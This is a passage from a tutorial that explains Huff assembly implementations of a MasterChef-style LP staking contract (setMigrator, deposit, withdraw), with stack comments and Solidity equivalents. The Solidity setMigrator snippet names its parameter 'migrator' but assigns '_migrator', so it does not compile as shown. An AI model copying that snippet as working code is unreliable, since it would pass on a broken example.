</span></code></pre></div></div><p>Solidity performs the arithmetic and storage updates in a single expression.<hr><h4 id=set-migrator-set-migration-contract>SET_MIGRATOR() - Set Migration Contract</h4><p>Sets the migrator contract address for LP token migration. This is the simplest state-changing function, demonstrating the minimal pattern for owner-only functions that perform a single storage write.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: SET_MIGRATOR()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SET_MIGRATOR</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#62a35c>ONLY_OWNER</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [migrator_address]
</span><span>
</span><span>    </span><span style=color:#0086b3>[MIGRATOR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// storage[MIGRATOR_SLOT] = migrator_address
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>    </span><span style=color:#969896;font-style:italic>// Halt execution successfully
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: setMigrator()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setMigrator</span><span>(</span><span style=color:#0086b3>address </span><span>migrator) </span><span style=color:#a71d5d;font-weight:700>external onlyOwner </span><span>{
</span><span>    migrator </span><span style=color:#a71d5d;font-weight:700>=</span><span> _migrator;
</span><span>}
</span></code></pre></div></div><p>A simple setter function with access control.<hr><h4 id=deposit-stake-lp-tokens>DEPOSIT() - Stake LP Tokens</h4><p>Stakes LP tokens into a pool and claims any pending rewards. This function introduces several critical opcodes and concepts: the <code>caller</code> opcode pushes msg.sender onto the stack, while <code>address</code> masks a value to 20 bytes (ensuring proper address formatting); <code>log3</code> emits an event with three indexed topics (the event signature hash plus two indexed parameters); <code>pop</code> discards the top stack item. The function demonstrates complex multi-step operations including checking and claiming pending rewards if the user already has a stake, transferring LP tokens from the user using <code>SAFE_TRANSFER_FROM()</code>, updating the user's staked amount and reward debt, and finally emitting a Deposit event. Safe math operations are performed using <code>SAFE_MUL()</code> for multiplication, <code>SAFE_DIV()</code> for division with zero-check, while <code>SAFE_SUSHI_TRANSFER()</code> handles reward token transfers and <code>__EVENT_HASH()</code> computes event signatures at compile time.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: DEPOSIT()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>DEPOSIT</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [amount]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(1) returns(0) - validates pid &lt; poolLength
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, pid, amount]
</span><span>
</span><span>    </span><span style=color:#62a35c>INNER_UPDATE_POOL</span><span>() </span><span style=color:#969896;font-style:italic>// takes(1) returns(0) - updates pool rewards
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, pid, amount]
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(1) returns(1) - calculates pool storage slot
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller dup3
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, msg.sender, pool_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#0086b3>[USER_INFO_SLOT]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [USER_INFO_SLOT, pid, msg.sender, pool_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x20</span><span>) </span><span style=color:#969896;font-style:italic>// takes(3) returns(1) - calculates userInfo[pid][msg.sender] slot
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user_slot, pool_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// user_slot = storage location of userInfo[pid][msg.sender]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 iszero
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [is_zero, user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>    user_amount_zero_jump </span><span style=color:#a71d5d;font-weight:700>jumpi </span><span style=color:#969896;font-style:italic>// if user.amount == 0, skip reward claim
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Claim Pending Rewards (if user.amount > 0) =====
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>[E]
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [1e12, user.amount, user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup5 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare, 1e12, user.amount, user.amount, user_slot, pool_slot, pid, amount]
</span><span>        </span><span style=color:#969896;font-style:italic>// Loaded from pool_slot + 3
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup5 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [user_slot+1, pool.accSushiPerShare, 1e12, user.amount, user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [user.rewardDebt, pool.accSushiPerShare, 1e12, user.amount, user.amount, user_slot, pool_slot, pid, amount]
</span><span>        </span><span style=color:#969896;font-style:italic>// Loaded from user_slot + 1
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>swap3
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, pool.accSushiPerShare, 1e12, user.rewardDebt, user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>        </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [user.amount * pool.accSushiPerShare, 1e12, user.rewardDebt, user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>        </span><span style=color:#62a35c>SAFE_DIV</span><span>() </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [(user.amount * pool.accSushiPerShare) / 1e12, user.rewardDebt, user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>        </span><span style=color:#62a35c>SAFE_SUB</span><span>() </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [pending, user.amount, user_slot, pool_slot, pid, amount]
</span><span>        </span><span style=color:#969896;font-style:italic>// pending = (user.amount * pool.accSushiPerShare) / 1e12 - user.rewardDebt
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>caller
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [msg.sender, pending, user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>        </span><span style=color:#62a35c>SAFE_SUSHI_TRANSFER</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(2) returns(0)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pool_slot, pid, amount]
</span><span>        </span><span style=color:#969896;font-style:italic>// Transfers 'pending' SUSHI to msg.sender
</span><span>
</span><span>    user_amount_zero_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Transfer LP Tokens from User =====
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lpToken, user.amount, user_slot, pool_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Loaded from pool_slot + 0
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup6 address caller
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [msg.sender, this, amount, pool.lpToken, user.amount, user_slot, pool_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// dup6 duplicates amount, address pushes address(this), caller pushes msg.sender
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_TRANSFER_FROM</span><span>(</span><span style=color:#0086b3>0x00</span><span>) </span><span style=color:#969896;font-style:italic>// takes(4) returns(0)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pool_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Transfers 'amount' LP tokens from msg.sender to this contract
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Update user.amount =====
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 dup6 </span><span style=color:#62a35c>SAFE_ADD</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount + amount, user.amount, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pool_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stores new user.amount to user_slot
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Calculate and Store new user.rewardDebt =====
</span><span>    </span><span style=color:#0086b3>[E] </span><span style=color:#a71d5d;font-weight:700>swap1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount + amount, 1e12, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup4 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare, user.amount + amount, 1e12, user_slot, pool_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [(user.amount + amount) * pool.accSushiPerShare / 1e12, user_slot, pool_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// This is the new rewardDebt
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user_slot, pool_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stores new rewardDebt to user_slot + 1
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Cleanup and Emit Event =====
</span><span>    </span><span style=color:#a71d5d;font-weight:700>pop pop swap1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [amount, pid]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stores amount at memory[0x00] for event data
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [msg.sender, pid]
</span><span>
</span><span>    </span><span style=color:#62a35c>__EVENT_HASH</span><span>(Deposit)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [event_sig, msg.sender, pid]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>log3
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Emits: Deposit(msg.sender, pid, amount)
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: deposit()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>deposit</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>    PoolInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> poolInfo[pid];
</span><span>    UserInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>user </span><span style=color:#a71d5d;font-weight:700>=</span><span> userInfo[pid][msg.sender];
</span><span>    </span><span style=color:#62a35c>updatePool</span><span>(pid);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(user.amount </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) {
</span><span>        </span><span style=color:#0086b3>uint256</span><span> pending </span><span style=color:#a71d5d;font-weight:700>=</span><span> user.amount </span><span style=color:#a71d5d;font-weight:700>*</span><span> pool.accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1e12 </span><span style=color:#a71d5d;font-weight:700>-</span><span> user.rewardDebt;
</span><span>        </span><span style=color:#62a35c>safeSushiTransfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, pending);
</span><span>    }
</span><span>
</span><span>    pool.lpToken.</span><span style=color:#62a35c>safeTransferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), amount);
</span><span>    user.amount </span><span style=color:#a71d5d;font-weight:700>=</span><span> user.amount </span><span style=color:#a71d5d;font-weight:700>+</span><span> amount;
</span><span>    user.rewardDebt </span><span style=color:#a71d5d;font-weight:700>=</span><span> user.amount </span><span style=color:#a71d5d;font-weight:700>*</span><span> pool.accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1e12;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Deposit</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, pid, amount);
</span><span>}
</span></code></pre></div></div><p>The Solidity version abstracts the reward calculation and storage updates into cleaner syntax with automatic handling of storage references and event emission.<hr><h4 id=withdraw-unstake-lp-tokens-and-claim-rewards>WITHDRAW() - Unstake LP Tokens and Claim Rewards</h4><p>Withdraws staked LP tokens from a pool and claims pending rewards. This function follows a similar pattern to DEPOSIT() but in reverse, introducing the <code>sub</code> opcode for subtraction and the <code>SAFE_TRANSFER()</code> macro which transfers ERC20 tokens from the contract to the user (opposite direction from <code>SAFE_TRANSFER_FROM()</code>). The function validates the withdrawal amount, claims any pending rewards, decreases the user's staked amount, updates the reward debt, and transfers the LP tokens back to the user.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: WITHDRAW()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>WITHDRAW</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [amount]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(1) returns(0) - validates pid &lt; poolLength
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller dup2
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, msg.sender, pid, amount]
</span><span>
</span><span>    </span><span style=color:#0086b3>[USER_INFO_SLOT]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [USER_INFO_SLOT, pid, msg.sender, pid, amount]
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x00</span><span>) </span><span style=color:#969896;font-style:italic>// takes(3) returns(1) - calculates userInfo[pid][msg.sender] slot
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 dup5 gt
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [amount > user.amount, user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>iszero
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [amount &lt;= user.amount, user.amount, user_slot, pid, amount]
</span><span>
</span><span>    continue_jump </span><span style=color:#a71d5d;font-weight:700>jumpi  </span><span style=color:#969896;font-style:italic>// if amount &lt;= user.amount, continue
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Revert if withdrawing more than deposited =====
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(WithdrawNotGood) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pid, amount]
</span><span>
</span><span>        </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>        </span><span style=color:#969896;font-style:italic>// Execution stops here if validation fails
</span><span>
</span><span>    continue_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Update Pool Rewards =====
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#62a35c>INNER_UPDATE_POOL</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(1) returns(0) - updates pool rewards
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(1) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot, user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Claim Pending Rewards =====
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 dup4 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.rewardDebt, user.amount, pool_slot, user.amount, user_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Loaded from user_slot + 1
</span><span>
</span><span>    </span><span style=color:#0086b3>[E] </span><span style=color:#a71d5d;font-weight:700>dup4 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare, 1e12, user.rewardDebt, user.amount, pool_slot, user.amount, user_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Loaded from pool_slot + 3
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 swap4
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, pool.accSushiPerShare, 1e12, user.rewardDebt, pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>() </span><span style=color:#62a35c>SAFE_SUB</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pending, pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// pending = (user.amount * pool.accSushiPerShare) / 1e12 - user.rewardDebt
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [msg.sender, pending, pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_SUSHI_TRANSFER</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(2) returns(0)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Transfers 'pending' SUSHI to msg.sender
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Update user.amount =====
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup6 dup4 sub
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount - amount, pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup5 sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stores new user.amount (old amount - withdrawal) to user_slot
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Calculate and Store new user.rewardDebt =====
</span><span>    </span><span style=color:#0086b3>[E] </span><span style=color:#a71d5d;font-weight:700>swap1 dup4
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount - amount, pool.accSushiPerShare, 1e12, pool_slot, user.amount, user_slot, pid, amount]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [(user.amount - amount) * pool.accSushiPerShare / 1e12, pool_slot, user.amount, user_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// This is the new rewardDebt
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup4 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot, user.amount, user_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stores new rewardDebt to user_slot + 1
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Transfer LP Tokens Back to User =====
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sload dup5 caller
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [msg.sender, amount, pool.lpToken, user.amount, user_slot, pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Loaded pool.lpToken from pool_slot
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_TRANSFER</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(3) returns(0)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, amount]
</span><span>    </span><span style=color:#969896;font-style:italic>// Transfers 'amount' LP tokens from contract to msg.sender
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Emit Event =====
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap3 </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [amount, pid]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stores amount at memory[0x00] for event data
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>pop caller
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [msg.sender, pid]
</span><span>
</span><span>    </span><span style=color:#62a35c>__EVENT_HASH</span><span>(Withdraw)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [event_sig, msg.sender, pid]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>log3
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Emits: Withdraw(msg.sender, pid, amount)
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: withdraw()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>    PoolInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> poolInfo[pid];
</span><span>    UserInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>user </span><span style=color:#a71d5d;font-weight:700>=</span><span> userInfo[pid][msg.sender];
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(user.amount </span><span style=color:#a71d5d;font-weight:700>>=</span><span> amount, </span><span style=color:#183691>"WithdrawNotGood"</span><span>);
</span><span>
</span><span>    </span><span style=color:#62a35c>updatePool</span><span>(pid);
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256</span><span> pending </span><span style=color:#a71d5d;font-weight:700>=</span><span> user.amount </span><span style=color:#a71d5d;font-weight:700>*</span><span> pool.accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1e12 </span><span style=color:#a71d5d;font-weight:700>-</span><span> user.rewardDebt;
</span><span>    </span><span style=color:#62a35c>safeSushiTransfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, pending);
</span><span>
</span><span>    user.amount </span><span style=color:#a71d5d;font-weight:700>=</span><span> user.amount </span><span style=color:#a71d5d;font-weight:700>-</span><span> amount;
